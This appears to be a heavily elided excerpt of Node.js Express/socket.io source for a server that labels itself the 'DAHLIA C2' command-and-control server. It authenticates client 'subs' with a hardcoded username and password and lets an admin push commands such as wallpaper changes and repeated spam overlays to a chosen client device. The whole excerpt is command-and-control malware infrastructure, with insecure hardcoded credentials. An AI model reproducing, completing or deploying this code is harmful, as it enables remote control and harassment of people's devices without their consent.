...
app.use(express.static(path.join(__dirname, 'dist'))); // Serve React Dashboard from dist dir
...
io.on('connection', (socket) => {
    ...
    socket.on('register', (data) => {
        ...
        if (data.type === 'sub') {
            ...
            if (data.username !== 'DAHLIA' || data.password !== 'masterkey') {
                socket.disconnect();
                return;
            }
...
app.post('/api/upload', upload.single('file'), (req, res) => {
    ...
    if (req.body.fromAdmin === 'true' && subId) {
        ...
        // Ricostruiamo la BASE_URL dove risiede il server C2
        ...
        if (imageType === 'wallpaper') {
            ...
            if (imageType === 'spam_overlay') {
                io.to(subId).emit('sub_command', { command: 'spam_overlay', payload: { url: fullUrl, count: count } });
            } else {
...
server.listen(PORT, '0.0.0.0', () => {
    console.log(`[DAHLIA C2] Unified Server listening on port ${PORT}`);
});
